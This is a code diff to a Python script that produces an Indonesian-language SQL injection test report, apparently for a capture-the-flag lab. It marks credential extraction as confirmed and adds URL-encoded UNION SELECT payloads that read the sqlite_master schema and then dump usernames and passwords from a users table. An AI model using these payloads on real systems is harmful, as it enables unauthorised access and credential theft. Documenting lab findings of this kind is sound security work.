@@ -120,8 +120,9 @@ def build(lang):
          "Jumlah kolom tepat 2: ORDER BY 2 OK, ORDER BY 3 error out-of-range."],
         ["VER-02.4", "CONFIRMED",
          "UNION SELECT 'a','b' ter-render di tabel - kolom teks siap eksploitasi."],
-        ["VER-02.5", "PENDING",
-         "Ekstraksi kredensial: payload final siap, eksekusi independen oleh Verzen."],
+        ["VER-02.5", "CONFIRMED",
+         "Ekstraksi kredensial tereksekusi penuh (curl, 5 Okt 2026): "
+         "administrator / Flag{union_attack_medium} tampil di halaman produk."],
     ], [62, 72, 346]))
     A(Spacer(1, 4))
 
@@ -177,7 +178,13 @@ def build(lang):
             "GET /filter?kategori=%27%20UNION%20SELECT%20%27a%27,%27b%27--\n"
             "-> baris \"a | b\" tampil di tabel produk (kedua kolom menerima teks)",
             s["code"]))
-        A(Paragraph("Langkah 4 - payload final (ekstraksi kredensial)", s["body"]))
+        A(Paragraph("Langkah 4 - penemuan skema database (sqlite_master)", s["body"]))
+        A(Preformatted(
+            "GET /filter?kategori=%27%20UNION%20SELECT%20sql,NULL%20FROM%20sqlite_master--\n"
+            "-> blueprint database tampil di tabel:\n"
+            "   CREATE TABLE users (username TEXT, password TEXT)\n"
+            "(nama tabel + kolom diketahui tanpa menebak)", s["code"]))
+        A(Paragraph("Langkah 5 - payload final (ekstraksi kredensial)", s["body"]))
         A(Preformatted(
             "GET /filter?kategori=%27%20UNION%20SELECT%20username,password%20FROM%20users--\n"
             "Query server hasil injeksi:\n"
